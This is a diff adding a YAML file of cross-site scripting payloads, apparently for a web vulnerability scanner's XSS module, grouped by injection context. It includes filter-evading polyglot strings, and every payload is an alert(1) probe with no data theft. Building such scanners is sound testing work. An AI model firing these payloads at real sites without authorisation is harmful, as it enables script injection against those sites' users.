@@ -1,0 +1,44 @@
+# XSS payloads organized by injection context.
+# Add new payloads here — no Python changes required.
+# Module: scanner/modules/xss.py
+
+html:
+  - "<img src=x onerror=alert(1)>"
+  - "<svg onload=alert(1)>"
+  - "<script>alert(1)</script>"
+  - "<details open ontoggle=alert(1)>"
+  - "<body onload=alert(1)>"
+  - "<iframe src=javascript:alert(1)>"
+  - "<input autofocus onfocus=alert(1)>"
+  - "<math><mtext></table></math><img src=1 onerror=alert(1)>"
+
+attribute:
+  - '" onfocus="alert(1)" autofocus="'
+  - "' onfocus='alert(1)' autofocus='"
+  - '" onmouseover="alert(1)"'
+  - '"><img src=x onerror=alert(1)>'
+  - "' onmouseover='alert(1)'"
+  - '" onblur="alert(1)" tabindex="1" id="x'
+  - "' onclick='alert(1)'"
+
+js:
+  - '";alert(1)//'
+  - "';alert(1)//"
+  - "`};alert(1)//"
+  - "\n};alert(1)\n//"
+  - '"-alert(1)-"'
+  - "\\u0022;alert(1)//"
+  - "\\x22;alert(1)//"
+
+comment:
+  - "--><script>alert(1)</script><!--"
+  - "--><img src=x onerror=alert(1)><!--"
+  - "--></comment><script>alert(1)</script>"
+
+unknown:
+  - '"><script>alert(1)</script>'
+  - "'><script>alert(1)</script>"
+  - "jaVasCript:/*-/*`/*`/*'/*\"/**/(/* */oNcliCk=alert())//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/oNloAd=alert()//"
+  - "<ScRiPt>alert(1)</ScRiPt>"
+  - "<img/src=1 onerror=alert(1)>"
+  - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
